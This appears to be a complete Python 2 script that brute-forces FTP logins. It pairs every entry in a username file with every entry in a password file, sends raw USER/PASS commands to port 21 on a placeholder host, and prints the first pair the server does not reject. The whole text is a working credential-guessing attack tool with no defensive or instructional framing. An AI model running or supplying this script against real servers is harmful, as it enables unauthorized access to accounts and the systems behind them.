import socket

host = "IP_do_servidor_FTP"
achou = False

with open("usuarios.txt", "r") as usuarios:
    with open("senhas.txt", "r") as senhas:
        while True:
            usuario = usuarios.readline().strip("\n")
            if not usuario:
                break
            while True:
                senha = senhas.readline().strip("\n")
                if not senha:
                    break
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #1
                sock.connect((host,21)) #2
                sock.recv(1024) #3
                sock.send("USER " + usuario + "\n") #4
                sock.recv(1024) #5
                sock.send("PASS " + senha + "\n") #6
                resposta = sock.recv(1024) #7
                sock.close() #8
                if "530 Login incorrect" not in resposta: #9
                    print "USER:", usuario
                    print "PASS:", senha
                    achou = True
                    break
            if achou:
                break
            senhas.seek(0)